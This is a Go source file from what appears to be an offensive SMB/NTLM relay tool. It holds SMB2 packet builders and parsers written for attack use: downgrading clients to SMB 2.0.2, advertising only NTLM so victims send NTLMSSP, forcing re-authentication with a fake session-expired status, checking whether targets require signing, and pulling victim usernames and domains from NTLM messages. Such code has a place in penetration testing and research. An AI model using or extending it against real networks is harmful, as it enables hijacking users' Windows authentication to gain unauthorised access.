// Self-contained SMB2 wire format for the relay. This is deliberately
// independent of libs/smb (the capture server used by the
// --llmnr/--nbt-ns/--mdns flags): the relay implements the SMB2 server *and*
// client, so the two attacks share no code.
//
// All "received packet" accessors below operate on the raw buffer *including*
// the 4-byte NetBIOS session header, so byte offsets line up with the wire
// (pkt[4] is the start of the SMB2 header).
package smbrelay

import (
	"crypto/rand"
	"encoding/binary"
	"net"
	"strings"
	"time"
)

const (
	smbPort = 445

	// SMB2 commands (MS-SMB2 2.2.1).
	cmdNegotiate    = uint16(0x0000)
	cmdSessionSetup = uint16(0x0001)
	cmdTreeConnect  = uint16(0x0003)

	// SMB2 header flag: response (server -> redirector).
	flagsServerToRedir = uint32(0x00000001)

	// NT status codes (little-endian on the wire).
	stSuccess        = uint32(0x00000000)
	stMoreProcessing = uint32(0xC0000016) // STATUS_MORE_PROCESSING_REQUIRED
	stLogonFailure   = uint32(0xC000006D) // STATUS_LOGON_FAILURE
	stSessionExpired = uint32(0xC0000203) // STATUS_NETWORK_SESSION_EXPIRED — forces re-auth
	stBadNetworkName = uint32(0xC00000CC) // STATUS_BAD_NETWORK_NAME
	stAccessDenied   = uint32(0xC0000022) // STATUS_ACCESS_DENIED

	// SMB2 dialects (MS-SMB2 2.2.3/2.2.4).
	dialect202      = uint16(0x0202) // SMB 2.0.2 — our downgrade target
	dialectWildcard = uint16(0x02FF) // SMB2 wildcard, used for the SMBv1->2 bump

	// NEGOTIATE SecurityMode bits (MS-SMB2 2.2.3/2.2.4):
	// 0x01 = signing enabled, 0x02 = signing required.
	signingEnabled  = 0x01
	signingRequired = 0x02
)

// ─────────────────────────────────────────────── NetBIOS framing ──────────

// nbRead reads one NetBIOS session message and returns the full buffer
// including the 4-byte session header (so SMB2 offsets are pkt[4]-relative).
func nbRead(conn net.Conn) ([]byte, error) {
	hdr := make([]byte, 4)
	if err := readFull(conn, hdr); err != nil {
		return nil, err
	}
	length := int(hdr[1])<<16 | int(hdr[2])<<8 | int(hdr[3])
	if length == 0 {
		return hdr, nil
	}
	body := make([]byte, length)
	if err := readFull(conn, body); err != nil {
		return nil, err
	}
	return append(hdr, body...), nil
}

// nbWrite frames msg (an SMB2 header+body) with a 4-byte NetBIOS session
// message header and writes it.
func nbWrite(conn net.Conn, msg []byte) error {
	frame := make([]byte, 4+len(msg))
	frame[0] = 0x00 // session message
	frame[1] = byte(len(msg) >> 16)
	frame[2] = byte(len(msg) >> 8)
	frame[3] = byte(len(msg))
	copy(frame[4:], msg)
	_, err := conn.Write(frame)
	return err
}

func readFull(conn net.Conn, buf []byte) error {
	for got := 0; got < len(buf); {
		n, err := conn.Read(buf[got:])
		got += n
		if err != nil && got < len(buf) {
			return err
		}
	}
	return nil
}

// ─────────────────────────────────────────────── SMB2 headers ─────────────

// respHdr builds a 64-byte SMB2 response header (Flags = SERVER_TO_REDIR).
func respHdr(cmd uint16, status uint32, msgID, sessID []byte, credits uint16) []byte {
	h := make([]byte, 64)
	copy(h[0:4], []byte{0xfe, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(h[4:6], 64)
	binary.LittleEndian.PutUint32(h[8:12], status)
	binary.LittleEndian.PutUint16(h[12:14], cmd)
	binary.LittleEndian.PutUint16(h[14:16], credits)
	binary.LittleEndian.PutUint32(h[16:20], flagsServerToRedir)
	if len(msgID) >= 8 {
		copy(h[24:32], msgID[:8])
	}
	copy(h[32:36], []byte{0xff, 0xfe, 0x00, 0x00}) // ProcessId
	if len(sessID) >= 8 {
		copy(h[40:48], sessID[:8])
	}
	return h
}

// reqHdr builds a 64-byte SMB2 request header (Flags = 0).
func reqHdr(cmd uint16, msgID uint64, sessID []byte, credits uint16) []byte {
	h := make([]byte, 64)
	copy(h[0:4], []byte{0xfe, 'S', 'M', 'B'})
	binary.LittleEndian.PutUint16(h[4:6], 64)
	binary.LittleEndian.PutUint16(h[12:14], cmd)
	binary.LittleEndian.PutUint16(h[14:16], credits)
	binary.LittleEndian.PutUint64(h[24:32], msgID)
	copy(h[32:36], []byte{0xff, 0xfe, 0x00, 0x00})
	if len(sessID) >= 8 {
		copy(h[40:48], sessID[:8])
	}
	return h
}

// ─────────────────────────────────── received-packet accessors ────────────

func isSMB2(pkt []byte) bool       { return len(pkt) > 18 && pkt[4] == 0xfe }
func isSMB1Nego(pkt []byte) bool   { return len(pkt) > 9 && pkt[4] == 0xff && pkt[8] == 0x72 }
func smb2Cmd(pkt []byte) uint16    { return binary.LittleEndian.Uint16(pkt[16:18]) }
func smb2Status(pkt []byte) uint32 { return binary.LittleEndian.Uint32(pkt[12:16]) }

func smb2MsgID(pkt []byte) []byte {
	if len(pkt) < 36 {
		return make([]byte, 8)
	}
	out := make([]byte, 8)
	copy(out, pkt[28:36])
	return out
}

func smb2SessID(pkt []byte) []byte {
	if len(pkt) < 52 {
		return make([]byte, 8)
	}
	out := make([]byte, 8)
	copy(out, pkt[44:52])
	return out
}

func smb2Credits(pkt []byte) uint16 {
	if len(pkt) < 20 {
		return 1
	}
	if v := binary.LittleEndian.Uint16(pkt[18:20]); v != 0 {
		return v
	}
	return 1
}

// ─────────────────────────────────── server-side body builders ────────────

// negoRespBody builds an SMB2 NEGOTIATE response advertising the given dialect
// and a SPNEGO token offering only NTLM (so the victim authenticates with
// NTLMSSP).
func negoRespBody(dialect uint16) []byte {
	spnego := spnegoInitNTLM()
	guid := randBytes(16)
	now := winTime()

	b := make([]byte, 0, 64+len(spnego))
	b = append(b, u16(65)...)             // StructureSize
	b = append(b, signingEnabled, 0x00)   // SecurityMode (enabled, not required)
	b = append(b, u16(dialect)...)        // DialectRevision
	b = append(b, 0x00, 0x00)             // Reserved (NegotiateContextCount)
	b = append(b, guid...)                // ServerGuid
	b = append(b, 0x00, 0x00, 0x00, 0x00) // Capabilities
	b = append(b, 0x00, 0x00, 0x10, 0x00) // MaxTransactSize
	b = append(b, 0x00, 0x00, 0x10, 0x00) // MaxReadSize
	b = append(b, 0x00, 0x00, 0x10, 0x00) // MaxWriteSize
	b = append(b, now...)                 // SystemTime
	b = append(b, now...)                 // ServerStartTime
	b = append(b, 0x80, 0x00)             // SecurityBufferOffset = 0x80
	b = append(b, u16(uint16(len(spnego)))...)
	b = append(b, 0x00, 0x00, 0x00, 0x00) // Reserved2 / NegotiateContextOffset
	b = append(b, spnego...)
	return b
}

// sessRespBody builds an SMB2 SESSION_SETUP response carrying secBlob (the
// security buffer offset is 0x48 = 64-byte header + 8-byte fixed body).
func sessRespBody(secBlob []byte) []byte {
	b := make([]byte, 0, 8+len(secBlob))
	b = append(b, u16(9)...)  // StructureSize
	b = append(b, 0x00, 0x00) // SessionFlags
	b = append(b, 0x48, 0x00) // SecurityBufferOffset
	b = append(b, u16(uint16(len(secBlob)))...)
	b = append(b, secBlob...)
	return b
}

// sessRespEmpty builds the SESSION_SETUP response body with no security buffer
// (used for the final LOGON_FAILURE answer to the victim).
func sessRespEmpty() []byte {
	b := u16(9)
	b = append(b, 0x00, 0x00) // SessionFlags
	b = append(b, 0x00, 0x00) // SecurityBufferOffset
	b = append(b, 0x00, 0x00) // SecurityBufferLength
	return b
}

// errorBody is the SMB2 ERROR response body (MS-SMB2 2.2.2): StructureSize 9,
// no error context, empty ByteCount with a single trailing ErrorData byte.
// Paired with a non-success Status in the header, it is how we return e.g.
// STATUS_NETWORK_SESSION_EXPIRED (to force a re-auth) or STATUS_BAD_NETWORK_NAME.
func errorBody() []byte {
	return []byte{0x09, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00}
}

// ─────────────────────────────────── client-side body builders ────────────

// negoReqBody builds an SMB2 NEGOTIATE request offering only SMB 2.0.2.
func negoReqBody() []byte {
	b := make([]byte, 0, 38)
	b = append(b, u16(36)...)             // StructureSize (fixed part)
	b = append(b, u16(1)...)              // DialectCount
	b = append(b, signingEnabled, 0x00)   // SecurityMode
	b = append(b, 0x00, 0x00)             // Reserved
	b = append(b, 0x00, 0x00, 0x00, 0x00) // Capabilities
	b = append(b, randBytes(16)...)       // ClientGuid
	b = append(b, make([]byte, 8)...)     // ClientStartTime
	b = append(b, u16(dialect202)...)
	return b
}

// sessReqBody builds an SMB2 SESSION_SETUP request wrapping secBlob (security
// buffer offset 0x58 = 64-byte header + 24-byte fixed body).
func sessReqBody(secBlob []byte) []byte {
	b := make([]byte, 0, 24+len(secBlob))
	b = append(b, u16(25)...)             // StructureSize
	b = append(b, 0x00)                   // Flags
	b = append(b, signingEnabled)         // SecurityMode
	b = append(b, 0x00, 0x00, 0x00, 0x00) // Capabilities
	b = append(b, 0x00, 0x00, 0x00, 0x00) // Channel
	b = append(b, 0x58, 0x00)             // SecurityBufferOffset
	b = append(b, u16(uint16(len(secBlob)))...)
	b = append(b, make([]byte, 8)...) // PreviousSessionId
	b = append(b, secBlob...)
	return b
}

// treeReqBody builds an SMB2 TREE_CONNECT request for path (UTF-16LE),
// path offset 0x48 = 64-byte header + 8-byte fixed body.
func treeReqBody(path []byte) []byte {
	b := make([]byte, 0, 8+len(path))
	b = append(b, u16(9)...)  // StructureSize
	b = append(b, 0x00, 0x00) // Flags / Reserved
	b = append(b, 0x48, 0x00) // PathOffset
	b = append(b, u16(uint16(len(path)))...)
	b = append(b, path...)
	return b
}

// ─────────────────────────────────── security-buffer parsers ──────────────

// reqSecBlob extracts the security buffer from a SESSION_SETUP *request*
// (descriptor at body offset 12). pkt includes the NetBIOS prefix.
func reqSecBlob(pkt []byte) []byte { return secBufAt(pkt, 12) }

// respSecBlob extracts the security buffer from a SESSION_SETUP *response*
// (descriptor at body offset 4).
func respSecBlob(pkt []byte) []byte { return secBufAt(pkt, 4) }

// secBufAt reads a {offset(2), length(2)} descriptor located bodyField bytes
// into the SMB2 body; offset is measured from the SMB2 header start.
func secBufAt(pkt []byte, bodyField int) []byte {
	if len(pkt) < 4+64+bodyField+4 {
		return nil
	}
	body := pkt[4+64:]
	off := int(binary.LittleEndian.Uint16(body[bodyField : bodyField+2]))
	length := int(binary.LittleEndian.Uint16(body[bodyField+2 : bodyField+4]))
	start := 4 + off
	if off < 64 || length <= 0 || start+length > len(pkt) {
		return nil
	}
	out := make([]byte, length)
	copy(out, pkt[start:start+length])
	return out
}

// negoRespSigningRequired reports whether a NEGOTIATE response (full packet)
// has the signing-required bit set in its SecurityMode field. SecurityMode is
// the 2 bytes right after StructureSize, i.e. body offset 2 (e.g. the "01" in
// "41 00 01 00 ..." = signing enabled; "02" = signing required).
func negoRespSigningRequired(pkt []byte) bool {
	if len(pkt) < 4+64+4 {
		return false
	}
	body := pkt[4+64:]
	return binary.LittleEndian.Uint16(body[2:4])&signingRequired != 0
}

// reqSigningRequired reports whether a SESSION_SETUP request (full packet) sets
// the signing-required bit (0x02) in its SecurityMode field. In the request the
// SecurityMode is a single byte at body offset 3, after StructureSize(2) and
// Flags(1) — e.g. the "02" in "19 00 00 02 ..." means signing required.
func reqSigningRequired(pkt []byte) bool {
	if len(pkt) < 4+64+4 {
		return false
	}
	return pkt[4+64+3]&signingRequired != 0
}

// ─────────────────────────────────────────────── NTLM parsing ─────────────

// ntlmType returns the NTLMSSP message type (1/2/3) found inside a (possibly
// SPNEGO-wrapped) security blob, or 0 if no NTLMSSP message is present.
func ntlmType(blob []byte) uint32 {
	idx := strings.Index(string(blob), "NTLMSSP\x00")
	if idx < 0 || idx+12 > len(blob) {
		return 0
	}
	return binary.LittleEndian.Uint32(blob[idx+8 : idx+12])
}

// parseType3Identity extracts DomainName, UserName and Workstation from an
// NTLMSSP_AUTHENTICATE (type 3) message.
func parseType3Identity(blob []byte) (domain, user, workstation string) {
	idx := strings.Index(string(blob), "NTLMSSP\x00")
	if idx < 0 {
		return "", "", ""
	}
	n := blob[idx:]
	if len(n) < 52 || binary.LittleEndian.Uint32(n[8:12]) != 3 {
		return "", "", ""
	}
	get := func(at int) string {
		length := int(binary.LittleEndian.Uint16(n[at : at+2]))
		off := int(binary.LittleEndian.Uint16(n[at+4 : at+6]))
		if length <= 0 || off < 0 || off+length > len(n) {
			return ""
		}
		return decodeUTF16LE(n[off : off+length])
	}
	domain = get(28)
	user = get(36)
	workstation = get(44)
	if workstation == "" {
		workstation = domain
	}
	return domain, user, workstation
}

// ─────────────────────────────────────────────── SPNEGO (NTLM only) ───────

// spnegoInitNTLM builds a GSS-API SPNEGO NegTokenInit whose only advertised
// mechanism is NTLMSSP.
func spnegoInitNTLM() []byte {
	spnegoOID := []byte{0x2b, 0x06, 0x01, 0x05, 0x05, 0x02}                       // 1.3.6.1.5.5.2
	ntlmOID := []byte{0x2b, 0x06, 0x01, 0x04, 0x01, 0x82, 0x37, 0x02, 0x02, 0x0a} // NTLMSSP

	mechTypes := asn1(0xa0, asn1(0x30, asn1(0x06, ntlmOID)))
	negTokenInit := asn1(0x30, mechTypes)
	negToken := asn1(0xa0, negTokenInit)
	inner := append(asn1(0x06, spnegoOID), negToken...)
	return asn1(0x60, inner)
}

// asn1 prepends a BER tag + (definite, minimal) length to data.
func asn1(tag byte, data []byte) []byte {
	out := []byte{tag}
	n := len(data)
	switch {
	case n <= 0x7f:
		out = append(out, byte(n))
	case n <= 0xff:
		out = append(out, 0x81, byte(n))
	default:
		out = append(out, 0x82, byte(n>>8), byte(n))
	}
	return append(out, data...)
}

// ─────────────────────────────────────────────── encoding helpers ─────────

func u16(v uint16) []byte { b := make([]byte, 2); binary.LittleEndian.PutUint16(b, v); return b }

func utf16LE(s string) []byte {
	b := make([]byte, 0, len(s)*2)
	for _, r := range s {
		b = append(b, byte(r), byte(r>>8))
	}
	return b
}

func decodeUTF16LE(b []byte) string {
	if len(b)%2 != 0 {
		return ""
	}
	runes := make([]rune, len(b)/2)
	for i := range runes {
		runes[i] = rune(binary.LittleEndian.Uint16(b[i*2:]))
	}
	return string(runes)
}

func winTime() []byte {
	delta := time.Since(time.Date(1601, 1, 1, 0, 0, 0, 0, time.UTC))
	b := make([]byte, 8)
	binary.LittleEndian.PutUint64(b, uint64(delta.Nanoseconds()/100))
	return b
}

func randBytes(n int) []byte {
	b := make([]byte, n)
	rand.Read(b)
	return b
}

func allZero(b []byte) bool {
	for _, v := range b {
		if v != 0 {
			return false
		}
	}
	return true
}

// remoteIP returns conn's peer IP (zone id preserved for link-local IPv6),
// stripping an IPv4-mapped prefix.
func remoteIP(conn net.Conn) string {
	host, _, err := net.SplitHostPort(conn.RemoteAddr().String())
	if err != nil {
		host = conn.RemoteAddr().String()
	}
	return strings.TrimPrefix(host, "::ffff:")
}
